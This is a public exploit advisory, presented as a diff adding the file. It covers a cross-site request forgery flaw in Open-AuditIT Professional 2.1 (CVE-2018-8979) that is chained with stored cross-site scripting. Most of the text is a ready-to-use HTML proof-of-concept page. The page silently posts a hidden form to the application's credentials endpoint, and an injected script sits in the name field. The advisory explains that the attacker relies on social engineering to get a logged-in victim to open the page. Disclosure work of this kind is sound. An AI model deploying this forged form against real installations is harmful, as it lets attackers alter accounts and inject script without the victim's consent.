@@ -1,0 +1,69 @@
+# Exploit Title: Open-AuditIT Professional 2.1 - Cross-Site Request Forgery (CSRF)
+# Date: 27-03-2018
+# Exploit Author: Nilesh Sapariya
+# Contact: https://twitter.com/nilesh_loganx
+# Website: https://nileshsapariya.blogspot.com
+# Vendor Homepage: https://www.open-audit.org/
+# Software Link  : https://www.open-audit.org/downloads.php
+# Version: 2.1
+# CVE : CVE-2018-8979
+# Tested on: Windows 10 Pro
+# Category: Webapp Open-AuditIT Professional 2.1
+
+
+1. Description:-
+There is no CSRF protection in Open-AuditIT application, with a little help
+of social engineering (like sending a link via email/chat) an attacker may
+force the victim to click on a malicious link by which any normal user can
+become an Admin user. The attack can force an end user to execute unwanted
+actions on a web application in which they're currently authenticated.
+Using this vulnerability, we were able to compromise entire user account
+with chaining this bug with XSS.
+
+
+
+2. Proof of Concept
+Login into Open-AuditIT Professional 2.1
+Step 1 :- Craft a HTML Page with XSS payload
+Step 2:- Save this .html file and send it to victim (Victim  should be
+loggedin in the browser)
+Crafted value will be added.
+
+
+Affected Code:
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/omk/open-audit/credentials"
+method="POST">
+      <input type="hidden" name="data&#91;attributes&#93;&#91;name&#93;"
+value="<img src=x onerror=alert('hacked');>" />
+      <input type="hidden"
+name="data&#91;attributes&#93;&#91;org&#95;id&#93;" value="1" />
+      <input type="hidden"
+name="data&#91;attributes&#93;&#91;description&#93;" value="CSRF" />
+      <input type="hidden" name="data&#91;attributes&#93;&#91;type&#93;"
+value="ssh" />
+      <input type="hidden"
+name="data&#91;attributes&#93;&#91;credentials&#93;&#91;username&#93;"
+value="test" />
+      <input type="hidden"
+name="data&#91;attributes&#93;&#91;credentials&#93;&#91;password&#93;"
+value="test" />
+      <input type="hidden" name="data&#91;type&#93;" value="credentials" />
+      <input type="hidden" name="submit" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+​​3] POCs and steps:
+https://nileshsapariya.blogspot.ae/2018/03/csrf-to-xss-open-auditit-professional-21.html
+
+
+Thanks & Regards,
+Nilesh Sapariya
+Security Researcher
+https://twitter.com/nilesh_loganx
+*https://nileshsapariya.blogspot.in
